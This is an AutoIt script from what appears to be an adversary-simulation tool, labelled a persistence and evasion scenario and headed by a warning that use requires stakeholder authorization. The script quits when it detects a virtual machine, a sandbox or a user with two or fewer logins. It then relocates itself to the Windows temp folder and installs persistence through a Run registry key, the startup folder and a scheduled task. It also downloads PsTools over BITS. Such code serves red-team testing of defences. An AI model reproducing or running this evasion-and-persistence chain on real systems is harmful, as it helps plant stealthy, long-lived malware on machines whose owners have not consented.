#include "..\APT-SimulActor.au3"

; CAUTION: The APT-SimulActor use requires authorization from proper stakeholders.
; Author and Contributors will not be responsible for the malfunctioning or weaponization of the tool.

; Persistence and evasion scenario.

HandleRelocation()

If DetectVM()               Then Exit
If Not DetectSandboxSleep() Then Exit
If GetLoginCount(GetCurrentUser()) <= 2 Then Exit

If Not IsRunningFromDir("C:\WINDOWS\TEMP") Then
   MoveAndExec("C:\WINDOWS\TEMP")
   Exit
EndIf

SetRunKeyPersistence()
AddToStartupFolder(@ScriptFullPath)
CreateScheduledTask(@ScriptFullPath)

DownloadFile($g_sPsToolsUrl, "bits", @TempDir & "\pstools.zip")
Unzip(@TempDir & "\pstools.zip", @TempDir & "\pstools")
